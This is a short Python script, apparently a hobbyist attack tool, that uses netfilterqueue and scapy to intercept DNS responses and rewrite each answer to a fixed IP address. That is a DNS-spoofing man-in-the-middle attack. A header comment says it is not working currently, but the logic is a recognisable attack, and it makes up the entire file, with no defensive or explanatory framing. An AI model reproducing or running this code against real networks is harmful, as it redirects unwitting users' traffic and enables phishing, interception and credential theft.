# NOT WORKING currently

import netfilterqueue
import scapy.all

address = "142.250.4.101"  # Redirect target IP

def spoof(packet):
    scapy_packet = scapy.all.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.all.DNSRR):
        print("[+] DNS request intercepted")
        
        # Modify DNS response
        qname = scapy_packet[scapy.all.DNSQR].qname
        response_packet = scapy.all.DNSRR(rrname=qname, rdata=address)
        
        scapy_packet[scapy.all.DNS].an = response_packet
        scapy_packet[scapy.all.DNS].ancount = 1
        
        # Recalculate checksums
        del scapy_packet[scapy.all.IP].len
        del scapy_packet[scapy.all.IP].chksum
        del scapy_packet[scapy.all.UDP].len
        del scapy_packet[scapy.all.UDP].chksum
        
        # Set new payload
        packet.set_payload(bytes(scapy_packet))
        print(f"[+] Spoofed DNS response: {qname} -> {address}")
    
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, spoof)
try:
    print("[+] Running DNS spoofing...")
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Exiting script")
    queue.unbind()
